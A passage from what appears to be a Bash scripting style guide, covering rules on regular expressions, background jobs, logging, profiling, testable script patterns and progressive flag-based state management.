# Optional with defaults
: "${OPTIONAL_VAR:=default_value}"
: "${LOG_LEVEL:=INFO}"

# Export with validation
export DATABASE_URL="${DATABASE_URL:-localhost:5432}"
export API_KEY="${API_KEY:?API_KEY environment variable required}"

# Check multiple required variables
declare -a REQUIRED=(DATABASE_URL API_KEY SECRET_TOKEN)
#...
check_required_env() {
  local -- var
  for var in "${REQUIRED[@]}"; do
    [[ -n "${!var:-}" ]] || {
      error "Required environment variable '$var' not set"
      return 1
    }
  done
  return 0
}
```


---


**Rule: BCS1405**

## Regular Expression Guidelines

Best practices for using regular expressions in Bash.

```bash
# Use POSIX character classes for portability
[[ "$var" =~ ^[[:alnum:]]+$ ]]      # Alphanumeric only
[[ "$var" =~ [[:space:]] ]]         # Contains whitespace
[[ "$var" =~ ^[[:digit:]]+$ ]]      # Digits only
[[ "$var" =~ ^[[:xdigit:]]+$ ]]     # Hexadecimal

# Store complex patterns in readonly variables
readonly -- EMAIL_REGEX='^[[:alnum:]._%+-]+@[[:alnum:].-]+\.[[:alpha:]]{2,}$'
readonly -- IPV4_REGEX='^([0-9]{1,3}\.){3}[0-9]{1,3}$'
readonly -- UUID_REGEX='^[[:xdigit:]]{8}-[[:xdigit:]]{4}-[[:xdigit:]]{4}-[[:xdigit:]]{4}-[[:xdigit:]]{12}$'

# Usage
[[ "$email" =~ $EMAIL_REGEX ]] || die 1 'Invalid email format'

# Capture groups
if [[ "$version" =~ ^v?([0-9]+)\.([0-9]+)\.([0-9]+)$ ]]; then
  major="${BASH_REMATCH[1]}"
  minor="${BASH_REMATCH[2]}"
  patch="${BASH_REMATCH[3]}"
fi
```


---


**Rule: BCS1406**

## Background Job Management

Managing background processes and jobs.

```bash
# Start background job and track PID
long_running_command &
PID=$!

# Check if process is still running
if kill -0 "$PID" 2>/dev/null; then
  info "Process $PID is still running"
fi

# Wait with timeout
if timeout 10 wait "$PID"; then
  success 'Process completed successfully'
else
  warn 'Process timed out or failed'
  kill "$PID" 2>/dev/null || true
fi

# Multiple background jobs
declare -a PIDS=()
for file in *.txt; do
  process_file "$file" &
  PIDS+=($!)
done

# Wait for all background jobs
for pid in "${PIDS[@]}"; do
  wait "$pid"
done

# Job control with error handling
run_with_timeout() {
  local -i timeout="$1"; shift
  local -- command="$*"

  timeout "$timeout" bash -c "$command" &
  local -i pid=$!

  if wait "$pid"; then
    return 0
  else
    local -i exit_code=$?
    if ((exit_code == 124)); then
      error "Command timed out after ${timeout}s"
    fi
    return "$exit_code"
  fi
}
```


---


**Rule: BCS1407**

## Logging Best Practices

Structured logging for production scripts.

```bash
# Simple file logging
readonly LOG_FILE="${LOG_FILE:-/var/log/${SCRIPT_NAME}.log}"
readonly LOG_LEVEL="${LOG_LEVEL:-INFO}"

# Ensure log directory exists
[[ -d "${LOG_FILE%/*}" ]] || mkdir -p "${LOG_FILE%/*}"

# Structured logging function
log() {
  local -- level="$1"
  local -- message="${*:2}"

  # Format: ISO8601 timestamp, script name, level, message
  printf '[%s] [%s] [%-5s] %s\n' \
    "$(date -Ins)" \
    "$SCRIPT_NAME" \
    "$level" \
    "$message" >> "$LOG_FILE"
}

# Convenience functions
log_debug() { log DEBUG "$@"; }
log_info()  { log INFO "$@"; }
log_warn()  { log WARN "$@"; }
log_error() { log ERROR "$@"; }
```


---


**Rule: BCS1408**

## Performance Profiling

Simple performance measurement patterns.

```bash
# Using SECONDS builtin
profile_operation() {
  local -- operation="$1"
  SECONDS=0

  # Run operation
  eval "$operation"

  info "Operation completed in ${SECONDS}s"
}

# High-precision timing with EPOCHREALTIME
timer() {
  local -- start end runtime
  start=$EPOCHREALTIME

  "$@"

  end=$EPOCHREALTIME
  runtime=$(awk "BEGIN {print $end - $start}")
  info "Execution time: ${runtime}s"
}
```


---


**Rule: BCS1409**

## Testing Support Patterns

Patterns for making scripts testable through dependency injection, test modes, and assertions.

```bash
# Dependency injection for testing - override commands with mock implementations
declare -f FIND_CMD >/dev/null || FIND_CMD() { find "$@"; }
declare -f DATE_CMD >/dev/null || DATE_CMD() { date "$@"; }
declare -f CURL_CMD >/dev/null || CURL_CMD() { curl "$@"; }

# Production usage
find_files() {
  FIND_CMD "$@"
}

# In tests, override:
FIND_CMD() { echo 'mocked_file1.txt mocked_file2.txt'; }

# Test mode flag for conditional behavior
declare -i TEST_MODE="${TEST_MODE:-0}"

if ((TEST_MODE)); then
  DATA_DIR='./test_data'
  RM_CMD() { echo "TEST: Would remove $*"; }
else
  DATA_DIR='/var/lib/app'
  RM_CMD() { rm "$@"; }
fi

# Assert function for tests
assert() {
  local -- expected="$1"
  local -- actual="$2"
  local -- message="${3:-Assertion failed}"

  if [[ "$expected" != "$actual" ]]; then
    >&2 echo "ASSERT FAIL: $message"
    >&2 echo "  Expected: '$expected'"
    >&2 echo "  Actual:   '$actual'"
    return 1
  fi
  return 0
}

# Test runner pattern - discovers and runs test_* functions
run_tests() {
  local -i passed=0 failed=0
  local -- test_func

  for test_func in $(declare -F | awk '$3 ~ /^test_/ {print $3}'); do
    if "$test_func"; then
      passed+=1
      echo "âœ“ $test_func"
    else
      failed+=1
      echo "âœ— $test_func"
    fi
  done

  echo "Tests: $passed passed, $failed failed"
  ((failed == 0))
}
```


---


**Rule: BCS1410**

## Progressive State Management

Manage script state by modifying boolean flags based on runtime conditions, separating decision logic from execution.

```bash
# Initial flag declarations
declare -i INSTALL_BUILTIN=0
declare -i BUILTIN_REQUESTED=0
declare -i SKIP_BUILTIN=0

# Parse command-line arguments
main() {
  while (($#)); do
    case $1 in
      --builtin)    INSTALL_BUILTIN=1
                    BUILTIN_REQUESTED=1
                    ;;
      --no-builtin) SKIP_BUILTIN=1
                    ;;
    esac
    shift
  done

  # Progressive state management: adjust flags based on runtime conditions

  # If user explicitly requested to skip, disable installation
  if ((SKIP_BUILTIN)); then
    INSTALL_BUILTIN=0
  fi

  # Check if prerequisites are met, adjust flags accordingly
  if ! check_builtin_support; then
    # If user explicitly requested builtins, try to install dependencies
    if ((BUILTIN_REQUESTED)); then
      warn 'bash-builtins package not found, attempting to install...'
      install_bash_builtins || {
        error 'Failed to install bash-builtins package'
        INSTALL_BUILTIN=0  # Disable builtin installation
      }
    else
      # User didn't explicitly request, just skip
      info 'bash-builtins not found, skipping builtin installation'
      INSTALL_BUILTIN=0
    fi
  fi

  # Build phase: disable on failure
  if ((INSTALL_BUILTIN)); then
    if ! build_builtin; then
      error 'Builtin build failed, disabling builtin installation'
      INSTALL_BUILTIN=0
    fi
  fi

  # Execution phase: actions based on final flag state
  install_standalone
  ((INSTALL_BUILTIN)) && install_builtin  # Only runs if still enabled

  show_completion_message
}
```

**Pattern structure:**
1. Declare boolean flags at top with initial values
2. Parse command-line arguments, set flags from user input
3. Progressively adjust flags based on runtime conditions (dependency checks, build failures, user preferences)
4. Execute actions based on final flag state

**State progression example:**
```bash
# 1. User input (--builtin flag)
INSTALL_BUILTIN=1
BUILTIN_REQUESTED=1

# 2. Override check (--no-builtin takes precedence)
((SKIP_BUILTIN)) && INSTALL_BUILTIN=0

# 3. Dependency check (no bash-builtins package)
if ! check_builtin_support; then
  if ((BUILTIN_REQUESTED)); then
    install_bash_builtins || INSTALL_BUILTIN=0
  else
    INSTALL_BUILTIN=0
  fi
fi

# 4. Build check (compilation failed)
((INSTALL_BUILTIN)) && ! build_builtin && INSTALL_BUILTIN=0

# 5. Final execution (only runs if INSTALL_BUILTIN=1)
((INSTALL_BUILTIN)) && install_builtin
```

**Benefits:**
- Clean separation between decision logic and action
- Easy to trace flag changes throughout execution
- Fail-safe behavior (disable features when prerequisites fail)
- User intent preserved (separate tracking flags)
- Idempotent execution

**Guidelines:**
- Group related flags (e.g., `INSTALL_*`, `SKIP_*`)
- Use separate flags for user intent vs. runtime state
- Document state transitions with comments
- Apply changes in logical order: parse ’ validate ’ execute
- Never modify flags during execution phase

**Rationale:** Allows scripts to adapt to runtime conditions while maintaining clarity about decision-making. Especially useful for installation scripts where features may need disabling based on system capabilities or build failures.
#fin
